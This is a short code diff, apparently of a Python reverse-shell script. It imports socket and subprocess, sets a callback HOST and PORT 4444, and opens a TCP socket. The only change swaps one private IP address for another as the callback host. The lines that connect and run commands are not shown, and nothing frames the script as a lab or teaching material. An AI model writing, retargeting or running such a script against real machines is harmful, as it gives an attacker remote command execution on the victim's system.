@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-HOST = '192.168.100.91'  # Change this to your desired host IP
+HOST = '192.168.100.34'  # Change this to your desired host IP
 PORT = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
